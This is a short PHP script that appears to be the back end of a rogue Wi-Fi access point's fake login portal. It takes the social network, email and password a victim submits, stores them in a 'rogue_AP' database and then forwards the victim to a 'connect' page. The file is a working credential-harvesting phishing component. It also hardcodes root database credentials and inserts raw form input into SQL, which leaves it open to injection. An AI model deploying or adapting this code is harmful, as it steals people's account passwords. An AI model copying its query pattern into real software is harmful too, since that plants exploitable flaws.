<?php
session_start();
ob_start();
$host="localhost";
$username="root";
$password="!@db101#$";
$db_name="rogue_AP";
$tbl_name="social_login";

	#mysql_connect("$host", "$username") or die("couldn't connect");
	#mysql_select_db("$db_name");

$conn = mysqli_connect($host, $username, $password, $db_name);

if (!$conn)
{
	die("CONNECTION FAILED: " . mysqli_connect_error());
}

$socialn=$_POST['socialn'];
$email=$_POST['email'];
$userpassword=$_POST['userpassword'];

/*
if($email != $userpassword)
{
	header("location:error.html");
	exit;
}
*/

#mysql_query("INSERT INTO social_login(socialn, password1, password2) VALUES('$password1', '$password2');");

$sql = "INSERT INTO social_login(socialn, email, userpassword) VALUES ('$socialn', '$email', '$userpassword');";

if (mysqli_query($conn, $sql)) 
{
    echo "New record created successfully";
}
else 
{
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}

$conn->close();
sleep(2);
header("location:connect.html");
ob_end_flush();
?>
